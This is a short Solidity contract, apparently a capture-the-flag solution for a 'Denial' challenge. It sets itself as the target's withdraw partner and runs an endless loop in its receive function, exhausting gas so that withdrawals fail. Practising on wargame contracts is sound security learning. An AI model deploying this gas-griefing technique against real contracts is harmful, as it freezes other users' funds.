// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "./Denial.sol";

contract DenialAttacker {
    Denial target;

    constructor(address payable _target) {
        target = Denial(_target);
    }

    function attack() public {
        target.setWithdrawPartner(address(this));
        // target.withdraw();
    }

    receive() external payable {
        uint256 i = 0;
        while (true) {
            i++;
        }
    }
}